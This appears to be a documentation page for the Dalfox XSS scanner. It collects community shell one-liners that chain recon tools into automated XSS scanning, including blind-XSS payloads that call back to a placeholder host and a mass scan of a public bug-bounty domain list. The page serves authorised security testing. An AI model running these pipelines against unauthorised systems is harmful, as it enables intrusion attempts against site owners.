---
title: One-Liner
redirect_from: /docs/tips/oneliner/
nav_order: 2
toc: true
layout: page
---

# Community One-Liners

* Scanning XSS from host / from [@cihanmehmet in awesome-oneliner-bugbounty](https://github.com/dwisiswant0/awesome-oneliner-bugbounty)
```bash
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```
* [Automating XSS using Dalfox, GF and Waybackurls](https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75)
```bash
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```
* [Find XSS and Blind XSS, and send every request to burpsuite for more manual testing
](https://twitter.com/Alra3ees/status/1407058456323014659)
```bash
dalfox file hosts --mining-dom  --deep-domxss --ignore-return -b 'YOURS.xss.ht' --follow-redirects --proxy http://127.0.0.1:8080
```
* [dalfox scan to bugbounty targets / from KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips#dalfox-scan-to-bugbounty-targets-1)
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
```
* [Recon subdomains and gau to search vuls Dalfox / from KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips#recon-subdomains-and-gau-to-search-vuls-dalfox)
```bash
assetfinder testphp.vulnweb.com | gau |  dalfox pipe
```
